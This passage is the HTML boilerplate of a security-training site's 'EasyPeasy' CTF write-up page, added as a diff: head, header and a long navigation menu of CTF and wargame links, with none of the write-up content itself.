@@ -1,0 +1,3410 @@
+<!DOC
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="http://itsec.aria-network.com/ctf-boxes/thm/easy/easypeasy/easypeasy/">
+      
+      
+        <link rel="prev" href="../../../../vulnhub/easy/jangow/jangow/">
+      
+      
+        <link rel="next" href="../../../../../tools/tmux/">
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.3.1">
+    
+    
+      
+        <title>EasyPeasy - ITSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.046329b4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.85d0ee34.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#overview" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="ITSec" class="md-header__button md-logo" aria-label="ITSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ITSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              EasyPeasy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../htb-academy/pentesting_basics/" class="md-tabs__link">
+          
+  
+  HTB Academy
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../overthewire/bandit/level0/" class="md-tabs__link">
+          
+  
+  overthewire.org
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../htb/easy/nibbles/nibbles/" class="md-tabs__link">
+          
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../tools/tmux/" class="md-tabs__link">
+          
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../cheatsheets/cheatsheet_basic_linux_tools/" class="md-tabs__link">
+          
+  
+  Cheatsheets
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="ITSec" class="md-nav__button md-logo" aria-label="ITSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    ITSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HTB Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../htb-academy/pentesting_basics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pentesting Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../htb-academy/web_requests/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Requests
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../htb-academy/javascript_deobfuscation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Javascript Deobfuscation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../htb-academy/network_enumeration_with_nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Enumeration with Nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../thm/template/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Template
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    overthewire.org
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            overthewire.org
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Bandit
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Bandit
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" >
+        
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Level 0-10
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Level 0-10
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level0-1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 0-1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level1-2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 1-2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level2-3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 2-3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level3-4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 3-4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level4-5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 4-5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level5-6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 5-6
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level6-7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 6-7
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level7-8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 7-8
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level8-9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 8-9
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level9-10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 9-10
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Level 11-20
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Level 11-20
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level10-11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 10-11
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level11-12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 11-12
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level12-13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 12-13
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level13-14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 13-14
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level14-15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 14-15
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level15-16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 15-16
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level16-17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 16-17
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level17-18.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 17-18
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level18-19.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 18-19
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level19-20.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 19-20
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_3" >
+        
+          <label class="md-nav__link" for="__nav_3_1_3" id="__nav_3_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Level 21-30
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Level 21-30
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level20-21.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 20-21
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level21-22.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 21-22
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level22-23.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 22-23
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level23-24.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 23-24
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level24-25.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 24-25
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level25-26.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 25-26
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level26-27.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 26-27
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level27-28.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 27-28
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level28-29.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 28-29
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level29-30.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 29-30
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_4" >
+        
+          <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Level 31-33
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            Level 31-33
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level30-31.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 30-31
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level31-32.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 31-32
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/bandit/level32-33.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 32-33
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Natas
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Natas
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../overthewire/natas/levoel1-2.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Level 1-2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1_1" >
+        
+          <label class="md-nav__link" for="__nav_4_1_1" id="__nav_4_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
